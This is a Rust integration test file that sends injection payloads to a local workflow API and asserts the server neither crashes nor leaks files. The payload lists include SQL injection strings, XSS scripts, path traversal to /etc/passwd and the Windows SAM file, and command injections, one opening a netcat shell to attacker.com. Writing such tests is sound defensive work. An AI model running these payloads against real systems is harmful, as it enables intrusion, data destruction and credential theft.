//! Injection Prevention Security Tests
//!
//! Tests for SQL injection, XSS, and other injection attack prevention.
//!
//! These tests verify:
//! - SQL injection attacks are prevented
//! - XSS attacks are prevented
//! - Command injection is prevented
//! - Input boundary validation works

use std::time::Duration;
use serde_json::json;
use uuid::Uuid;

const API_BASE: &str = "http://localhost:3001/api";

/// Check if server is running
async fn server_is_running() -> bool {
    reqwest::Client::new()
        .get(&format!("{}/cli_types", API_BASE))
        .timeout(Duration::from_secs(5))
        .send()
        .await
        .is_ok()
}

/// Create HTTP client
fn client() -> reqwest::Client {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .expect("Failed to create HTTP client")
}

/// SQL injection payloads to test
const SQL_INJECTION_PAYLOADS: &[&str] = &[
    "' OR '1'='1",
    "'; DROP TABLE workflows; --",
    "1; DELETE FROM workflows WHERE 1=1; --",
    "' UNION SELECT * FROM users --",
    "1' AND '1'='1",
    "admin'--",
    "' OR 1=1 --",
    "'; EXEC xp_cmdshell('dir'); --",
    "1; WAITFOR DELAY '0:0:5' --",
    "' OR ''='",
    "1 OR 1=1",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "' AND id IS NOT NULL; --",
    "' HAVING 1=1 --",
    "' GROUP BY columnnames having 1=1 --",
    "' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename') --",
    "'; shutdown --",
];

/// XSS payloads to test
const XSS_PAYLOADS: &[&str] = &[
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'>",
    "<input onfocus=alert('XSS') autofocus>",
    "'\"><script>alert('XSS')</script>",
    "<a href=\"javascript:alert('XSS')\">click</a>",
    "<div style=\"background:url(javascript:alert('XSS'))\">",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert('XSS')}",
    "<%=alert('XSS')%>",
];

/// Command injection payloads to test
const COMMAND_INJECTION_PAYLOADS: &[&str] = &[
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "`id`",
    "$(whoami)",
    "; rm -rf /",
    "| nc -e /bin/sh attacker.com 4444",
    "&& cat /etc/shadow",
    "|| true",
    "; ping -c 10 127.0.0.1",
    "$(cat /etc/passwd)",
    "`cat /etc/passwd`",
];

/// Path traversal payloads to test
const PATH_TRAVERSAL_PAYLOADS: &[&str] = &[
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd%00.jpg",
    "....\\....\\....\\windows\\system32\\config\\sam",
];

#[tokio::test]
#[ignore = "requires running server"]
async fn test_sql_injection_in_workflow_name() {
    if !server_is_running().await {
        eprintln!("Server not running, skipping test");
        return;
    }

    let client = client();

    println!("\n=== SQL Injection Prevention Test (Workflow Name) ===");

    for payload in SQL_INJECTION_PAYLOADS {
        let project_id = Uuid::new_v4().to_string();

        // Get CLI type and model
        let cli_types: Vec<serde_json::Value> = client
            .get(&format!("{}/cli_types", API_BASE))
            .send()
            .await
            .unwrap()
            .json()
            .await
            .unwrap();

        if cli_types.is_empty() {
            continue;
        }

        let cli_type_id = cli_types[0]["id"].as_str().unwrap();

        let models: Vec<serde_json::Value> = client
            .get(&format!("{}/cli_types/{}/models", API_BASE, cli_type_id))
            .send()
            .await
            .unwrap()
            .json()
            .await
            .unwrap();

        if models.is_empty() {
            continue;
        }

        let model_id = models[0]["id"].as_str().unwrap();

        let request_payload = json!({
            "projectId": project_id,
            "name": payload,  // SQL injection in name field
            "description": "Test workflow",
            "useSlashCommands": false,
            "mergeTerminalConfig": {
                "cliTypeId": cli_type_id,
                "modelConfigId": model_id
            },
            "targetBranch": "main",
            "tasks": [{
                "name": "Test Task",
                "description": "Test task",
                "orderIndex": 0,
                "terminals": [{
                    "cliTypeId": cli_type_id,
                    "modelConfigId": model_id,
                    "orderIndex": 0
                }]
            }]
        });

        let response = client
            .post(&format!("{}/workflows", API_BASE))
            .json(&request_payload)
            .send()
            .await
            .expect("Request failed");

        let status = response.status().as_u16();

        // Should either succeed (payload stored safely) or return 400 (validation error)
        // Should NEVER return 500 (server error from SQL injection)
        assert!(
            status != 500,
            "SQL injection payload '{}' caused server error",
            payload
        );

        // If successful, verify the payload was stored as-is (not executed)
        if status == 200 || status == 201 {
            let body: serde_json::Value = response.json().await.unwrap_or_default();

            // Try to get the created workflow ID and verify name
            if let Some(workflow_id) = body.pointer("/data/id")
                .or_else(|| body.pointer("/data/workflow/id"))
                .and_then(|v| v.as_str())
            {
                let get_response = client
                    .get(&format!("{}/workflows/{}", API_BASE, workflow_id))
                    .send()
                    .await;

                if let Ok(resp) = get_response {
                    if resp.status().is_success() {
                        let workflow: serde_json::Value = resp.json().await.unwrap_or_default();
                        if let Some(name) = workflow.pointer("/data/name").and_then(|v| v.as_str()) {
                            // The payload should be stored as literal text, not executed
                            assert_eq!(
                                name, *payload,
                                "SQL injection payload should be stored as literal text"
                            );
                        }
                    }
                }

                // Cleanup
                let _ = client.delete(&format!("{}/workflows/{}", API_BASE, workflow_id)).send().await;
            }
        }

        println!("OK: Payload '{}' handled safely (status: {})", payload, status);
    }
}

#[tokio::test]
#[ignore = "requires running server"]
async fn test_sql_injection_in_query_params() {
    if !server_is_running().await {
        eprintln!("Server not running, skipping test");
        return;
    }

    let client = client();

    println!("\n=== SQL Injection Prevention Test (Query Params) ===");

    for payload in SQL_INJECTION_PAYLOADS {
        // Test in project_id query parameter (Fixed: use correct param name)
        let response = client
            .get(&format!("{}/workflows?project_id={}", API_BASE, urlencoding::encode(payload)))
            .send()
            .await
            .expect("Request failed");

        let status = response.status().as_u16();

        // Should return 400 (invalid UUID) or empty results, never 500
        assert!(
            status != 500,
            "SQL injection in project_id '{}' caused server error",
            payload
        );

        println!("OK: Query param payload '{}' handled safely (status: {})", payload, status);
    }
}

#[tokio::test]
#[ignore = "requires running server"]
async fn test_xss_prevention_in_workflow_fields() {
    if !server_is_running().await {
        eprintln!("Server not running, skipping test");
        return;
    }

    let client = client();

    println!("\n=== XSS Prevention Test ===");

    for payload in XSS_PAYLOADS {
        let project_id = Uuid::new_v4().to_string();

        let cli_types: Vec<serde_json::Value> = client
            .get(&format!("{}/cli_types", API_BASE))
            .send()
            .await
            .unwrap()
            .json()
            .await
            .unwrap();

        if cli_types.is_empty() {
            continue;
        }

        let cli_type_id = cli_types[0]["id"].as_str().unwrap();

        let models: Vec<serde_json::Value> = client
            .get(&format!("{}/cli_types/{}/models", API_BASE, cli_type_id))
            .send()
            .await
            .unwrap()
            .json()
            .await
            .unwrap();

        if models.is_empty() {
            continue;
        }

        let model_id = models[0]["id"].as_str().unwrap();

        let request_payload = json!({
            "projectId": project_id,
            "name": payload,  // XSS in name
            "description": payload,  // XSS in description
            "useSlashCommands": false,
            "mergeTerminalConfig": {
                "cliTypeId": cli_type_id,
                "modelConfigId": model_id
            },
            "targetBranch": "main",
            "tasks": [{
                "name": payload,  // XSS in task name
                "description": payload,  // XSS in task description
                "orderIndex": 0,
                "terminals": [{
                    "cliTypeId": cli_type_id,
                    "modelConfigId": model_id,
                    "orderIndex": 0
                }]
            }]
        });

        let response = client
            .post(&format!("{}/workflows", API_BASE))
            .json(&request_payload)
            .send()
            .await
            .expect("Request failed");

        let status = response.status().as_u16();

        // Server should handle XSS payloads without error
        assert!(
            status != 500,
            "XSS payload '{}' caused server error",
            payload
        );

        // If successful, the response should have the payload escaped or stored as-is
        // (XSS prevention is typically done on the frontend, but backend should not crash)
        if status == 200 || status == 201 {
            let body: serde_json::Value = response.json().await.unwrap_or_default();

            if let Some(workflow_id) = body.pointer("/data/id")
                .or_else(|| body.pointer("/data/workflow/id"))
                .and_then(|v| v.as_str())
            {
                // Cleanup
                let _ = client.delete(&format!("{}/workflows/{}", API_BASE, workflow_id)).send().await;
            }
        }

        println!("OK: XSS payload handled safely (status: {})", status);
    }
}

#[tokio::test]
#[ignore = "requires running server"]
async fn test_path_traversal_prevention() {
    if !server_is_running().await {
        eprintln!("Server not running, skipping test");
        return;
    }

    let client = client();

    println!("\n=== Path Traversal Prevention Test ===");

    for payload in PATH_TRAVERSAL_PAYLOADS {
        // Test in workflow ID path
        let response = client
            .get(&format!("{}/workflows/{}", API_BASE, urlencoding::encode(payload)))
            .send()
            .await
            .expect("Request failed");

        let status = response.status().as_u16();

        // Should return 400 or 404, never expose file contents
        assert!(
            status == 400 || status == 404,
            "Path traversal '{}' returned unexpected status {}",
            payload,
            status
        );

        // Response should not contain file contents
        let body = response.text().await.unwrap_or_default();
        assert!(
            !body.contains("root:") && !body.contains("[boot loader]"),
            "Path traversal '{}' may have exposed file contents",
            payload
        );

        println!("OK: Path traversal '{}' blocked (status: {})", payload, status);
    }
}

#[tokio::test]
#[ignore = "requires running server"]
async fn test_input_length_limits() {
    if !server_is_running().await {
        eprintln!("Server not running, skipping test");
        return;
    }

    let client = client();

    println!("\n=== Input Length Limits Test ===");

    // Test with extremely long inputs
    let long_string = "x".repeat(100_000);  // 100KB string

    let cli_types: Vec<serde_json::Value> = client
        .get(&format!("{}/cli_types", API_BASE))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();

    if cli_types.is_empty() {
        eprintln!("No CLI types found, skipping test");
        return;
    }

    let cli_type_id = cli_types[0]["id"].as_str().unwrap();

    let models: Vec<serde_json::Value> = client
        .get(&format!("{}/cli_types/{}/models", API_BASE, cli_type_id))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();

    if models.is_empty() {
        eprintln!("No models found, skipping test");
        return;
    }

    let model_id = models[0]["id"].as_str().unwrap();

    let request_payload = json!({
        "projectId": Uuid::new_v4().to_string(),
        "name": long_string,
        "description": "Test",
        "useSlashCommands": false,
        "mergeTerminalConfig": {
            "cliTypeId": cli_type_id,
            "modelConfigId": model_id
        },
        "targetBranch": "main",
        "tasks": [{
            "name": "Test",
            "description": "Test",
            "orderIndex": 0,
            "terminals": [{
                "cliTypeId": cli_type_id,
                "modelConfigId": model_id,
                "orderIndex": 0
            }]
        }]
    });

    let response = client
        .post(&format!("{}/workflows", API_BASE))
        .json(&request_payload)
        .send()
        .await
        .expect("Request failed");

    let status = response.status().as_u16();

    // Should either reject (400/413) or handle gracefully
    // Should not cause server crash (500)
    assert!(
        status != 500,
        "Long input caused server error"
    );

    println!("OK: Long input handled (status: {})", status);
}

#[tokio::test]
#[ignore = "requires running server"]
async fn test_null_byte_injection() {
    if !server_is_running().await {
        eprintln!("Server not running, skipping test");
        return;
    }

    let client = client();

    println!("\n=== Null Byte Injection Test ===");

    let null_byte_payloads = vec![
        "test\x00.txt",
        "workflow\x00; DROP TABLE",
        "name\x00<script>",
    ];

    for payload in null_byte_payloads {
        let response = client
            .get(&format!("{}/workflows/{}", API_BASE, urlencoding::encode(payload)))
            .send()
            .await
            .expect("Request failed");

        let status = response.status().as_u16();

        // Should handle null bytes safely
        assert!(
            status == 400 || status == 404,
            "Null byte payload returned unexpected status {}",
            status
        );

        println!("OK: Null byte payload handled (status: {})", status);
    }
}

#[tokio::test]
fn test_parameterized_query_patterns() {
    // Document expected parameterized query patterns
    println!("\n=== Parameterized Query Pattern Verification ===");

    // These patterns should be used in the codebase
    let safe_patterns = vec![
        "sqlx::query!(\"SELECT * FROM workflows WHERE id = ?\", id)",
        "sqlx::query_as!(Workflow, \"SELECT * FROM workflows WHERE project_id = ?\", project_id)",
        ".bind(&workflow_id)",
        ".bind(&project_id)",
    ];

    // These patterns should NOT be used
    let unsafe_patterns = vec![
        "format!(\"SELECT * FROM workflows WHERE id = '{}'\", id)",
        "format!(\"DELETE FROM workflows WHERE id = {}\", id)",
        "query(&format!(\"SELECT * FROM {} WHERE\", table))",
    ];

    println!("Safe patterns (should be used):");
    for pattern in &safe_patterns {
        println!("  OK: {}", pattern);
    }

    println!("\nUnsafe patterns (should NOT be used):");
    for pattern in &unsafe_patterns {
        println!("  BAD: {}", pattern);
    }
}

#[cfg(test)]
mod unicode_tests {
    use super::*;

    #[tokio::test]
    #[ignore = "requires running server"]
    async fn test_unicode_handling() {
        if !server_is_running().await {
            eprintln!("Server not running, skipping test");
            return;
        }

        let client = client();

        println!("\n=== Unicode Handling Test ===");

        let unicode_payloads = vec![
            // Fixed: Use Unicode escape sequences for cross-platform compatibility
            "\u{5DE5}\u{4F5C}\u{6D41}\u{6D4B}\u{8BD5}",  // Chinese: workflow test
            "\u{30EF}\u{30FC}\u{30AF}\u{30D5}\u{30ED}\u{30FC}",  // Japanese: workflow
            "\u{C6CC}\u{D06C}\u{D50C}\u{B85C}\u{C6B0}",  // Korean: workflow
            "\u{1F680}\u{1F525}\u{1F4BB}",  // Emojis
            "\u{03A9}\u{2248}\u{00E7}\u{221A}\u{222B}",  // Math symbols
            "\u{202E}reversed\u{202C}",  // RTL override
            "test\u{FEFF}bom",  // BOM character
        ];

        for payload in unicode_payloads {
            let response = client
                .get(&format!(
                    "{}/workflows?project_id={}&search={}",
                    API_BASE,
                    Uuid::new_v4(),
                    urlencoding::encode(payload)
                ))
                .send()
                .await;

            match response {
                Ok(r) => {
                    let status = r.status().as_u16();
                    assert!(
                        status != 500,
                        "Unicode payload '{}' caused server error",
                        payload
                    );
                    println!("OK: Unicode '{}' handled (status: {})", payload, status);
                }
                Err(e) => {
                    println!("WARN: Request failed for '{}': {}", payload, e);
                }
            }
        }
    }
}
